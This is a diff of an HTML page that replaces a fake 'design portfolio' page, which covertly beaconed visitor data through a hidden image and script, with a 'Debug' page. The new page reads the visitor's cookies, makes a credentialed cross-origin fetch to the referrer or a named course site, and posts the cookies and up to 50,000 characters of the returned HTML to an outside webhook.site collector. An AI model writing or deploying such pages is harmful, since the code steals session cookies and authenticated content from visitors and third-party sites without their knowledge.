@@ -1,56 +1,76 @@
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Design Inspiration</title>
+    <title>Debug</title>
 </head>
 <body>
-    <h1>Welcome to my design portfolio</h1>
-    <p>Explore modern web design.</p>
-
-    <!-- Проверка загрузки HTML даже без JavaScript -->
-    <img
-        src="https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76?event=html_loaded"
-        style="display:none"
-        alt=""
-    >
-
-    <pre id="debug"></pre>
-
+    <h1>Debug Info</h1>
+    <pre id="log"></pre>
     <script>
-    (function () {
-        const webhook =
-            "https://webhook.site/04627747-f0d1-4900-a55e-727048b0bf76";
-
-        const info = {
-            event: "js_executed",
-            url: window.location.href,
-            origin: window.location.origin,
-            referrer: document.referrer || "none",
+        const log = document.getElementById('log');
+        const webhookUrl = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
+        
+        // Собираем всю информацию о контексте
+        const debugInfo = {
+            my_url: window.location.href,
+            referrer: document.referrer || 'none',
             user_agent: navigator.userAgent,
-            has_opener: !!window.opener,
-            timestamp: new Date().toISOString()
+            timestamp: new Date().toISOString(),
+            cookies: document.cookie || 'none',
+            has_opener: !!window.opener
         };
-
-        document.getElementById("debug").textContent =
-            JSON.stringify(info, null, 2);
-
-        function send(data) {
-            const url = new URL(webhook);
-
-            for (const [key, value] of Object.entries(data)) {
-                url.searchParams.set(key, String(value));
-            }
-
-            const img = new Image();
-            img.style.display = "none";
-            img.src = url.toString();
-            document.body.appendChild(img);
-        }
-
-        send(info);
-    })();
+        
+        log.textContent = JSON.stringify(debugInfo, null, 2) + '\n\n';
+        
+        // Пробуем fetch с полным логированием
+        const targetUrl = debugInfo.referrer || 'https://cats.is-course.ru';
+        log.textContent += `Attempting fetch to: ${targetUrl}\n`;
+        
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include',
+            mode: 'cors'
+        })
+        .then(response => {
+            log.textContent += `✅ Response received!\n`;
+            log.textContent += `Status: ${response.status}\n`;
+            log.textContent += `Headers:\n`;
+            response.headers.forEach((value, key) => {
+                log.textContent += `  ${key}: ${value}\n`;
+            });
+            return response.text();
+        })
+        .then(html => {
+            log.textContent += `\nHTML length: ${html.length}\n`;
+            log.textContent += `HTML preview:\n${html.substring(0, 500)}`;
+            
+            // Отправляем на webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    debug_info: debugInfo,
+                    target_url: targetUrl,
+                    html_content: html.substring(0, 50000),
+                    success: true
+                })
+            });
+        })
+        .catch(err => {
+            log.textContent += `\n❌ Error: ${err.message}\n`;
+            log.textContent += `This means CORS is blocking the request.`;
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    debug_info: debugInfo,
+                    target_url: targetUrl,
+                    error: err.message,
+                    success: false
+                })
+            });
+        });
     </script>
 </body>
 </html>
